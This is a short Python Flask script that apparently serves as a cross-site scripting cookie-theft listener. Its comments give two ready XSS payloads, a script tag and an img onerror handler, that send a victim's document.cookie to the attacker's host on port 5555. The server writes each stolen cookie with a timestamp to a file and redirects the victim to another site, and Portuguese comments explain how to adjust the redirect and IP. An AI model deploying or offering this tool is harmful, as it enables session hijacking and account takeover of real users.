from flask import Flask, request, redirect
from datetime import datetime

# Payloads
# <script type="text/javascript">document.location="http://<IP>:5555/?c="+document.cookie;</script>
# <img src=x onerror=this.src="http://<IP>:5555/?c="+document.cookie;>

app = Flask(__name__)


@app.route('/')
def cookie():
	cookie = request.args.get('c')
	f = open('cookies.txt', 'a')
	f.write(str(cookie) + ' ' + str(datetime.now()) + '\n')
	f.close()
	print('Cookie:' ,cookie)

	return redirect('http://nsworld.com.br') #Altere para a pág. que deseja redirecionar

if __name__ == '__main__':
	app.run(host = '0.0.0.0', port=5555) #Altere o IP, padrão localhost
